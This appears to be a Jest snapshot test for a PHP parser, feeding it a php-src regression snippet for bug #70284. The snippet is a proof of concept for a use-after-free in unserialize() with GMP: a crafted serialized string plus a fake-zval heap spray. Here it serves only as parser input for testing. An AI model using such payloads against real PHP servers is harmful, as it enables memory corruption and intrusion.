// eslint-disable prettier/prettier
const parser = require("../main");

describe("php-src tests", function () {
  // ext/gmp/tests/bug70284.phpt
  it("Bug #70284 (Use after free vulnerability in unserialize() with GMP)", function () {
    expect(parser.parseCode("<?php\n$inner = 'r:2;a:1:{i:0;a:1:{i:0;r:4;}}';\n$exploit = 'a:2:{i:0;s:1:\"1\";i:1;C:3:\"GMP\":'.strlen($inner).':{'.$inner.'}}';\n$data = unserialize($exploit);\n$fakezval = ptr2str(1122334455);\n$fakezval .= ptr2str(0);\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\n$fakezval .= \"\\x01\";\n$fakezval .= \"\\x00\";\n$fakezval .= \"\\x00\\x00\";\nfor ($i = 0; $i < 5; $i++) {\n    $v[$i] = $fakezval.$i;\n}\nvar_dump($data);\nfunction ptr2str($ptr)\n{\n$out = '';\n    for ($i = 0; $i < 8; $i++) {\n        $out .= chr($ptr & 0xff);\n        $ptr >>= 8;\n    }\n    return $out;\n}\n?>")).toMatchSnapshot();
  });
});
